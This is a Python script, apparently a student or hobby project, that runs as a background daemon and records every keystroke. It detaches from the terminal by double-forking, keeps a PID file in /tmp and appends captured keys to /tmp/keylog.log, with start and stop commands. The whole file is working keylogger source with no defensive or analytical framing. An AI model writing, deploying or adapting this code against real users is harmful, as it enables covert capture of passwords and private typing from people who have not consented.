#!/usr/bin/python3

from pynput import keyboard
import sys
import os
import atexit
import signal

pidFile = '/tmp/keylog.pid'


def sigTermTermination(signalNo,  frame):
    raise SystemExit('Key logger terminated')


def processTerminator(signalNumber,  functionReference):
    # wait for child processes to complete and destroy them
    while True:
        try:
            pid,  status = os.waitpid(-1,  os.WNOHANG)
        except OSError:
            return
        # no more zombies
        if pid == 0:
            return


if len(sys.argv) < 2:
    print('Incorrect Args! Usage: ./a1KeyLogger.py [start | stop]')
    raise SystemExit('Exit Code: ' + str(1))

# detect start command
if sys.argv[1] == 'start':
    try:
        if os.path.exists(pidFile):
            raise RuntimeError('Key logger already running!')

        try:
            if os.fork() > 0:
                # Parent exit
                raise SystemExit(0)
        except OSError as e:
            raise RuntimeError(f'fork #1 failed: {e}')

        os.chdir('/tmp')
        os.umask(0)
        os.setsid()

        try:
            if os.fork() > 0:
                # Parent exit
                raise SystemExit(0)
        except OSError as e:
            raise RuntimeError(f'fork #2 failed: {e}')

        try:
            with open(pidFile,  'w') as fileHandler:
                fileHandler.write(str(os.getpid()))
        except Exception as err:
            raise Exception(err)

        atexit.register(lambda: os.remove(pidFile))

        signal.signal(signal.SIGTERM,  sigTermTermination)

        def keyPressed(key):
            if str(key) == 'Key.esc':
                sys.exit(0)
            else:
                with open('/tmp/keylog.log',  'a') as fileHandler:
                    fileHandler.write(str(key))

        with keyboard.Listener(on_press=keyPressed) as listener:
            listener.join()

    except RuntimeError as err:
        print(err)
    raise SystemExit('Exit Code: ' + str(1))

# detect stop command and send signal to kill daemon
elif sys.argv[1] == 'stop':
    if os.path.exists(pidFile):
        with open(pidFile) as fileHandler:
            os.kill(int(fileHandler.read()),  signal.SIGTERM)
    else:
        print('Key logger is not currently running!')
        raise SystemExit('Exit Code: ' + str(1))

# detect erroneous command=
else:
    print('Unknown command:',  str(sys.argv[1]))
    raise SystemExit('Exit Code: ' + str(1))
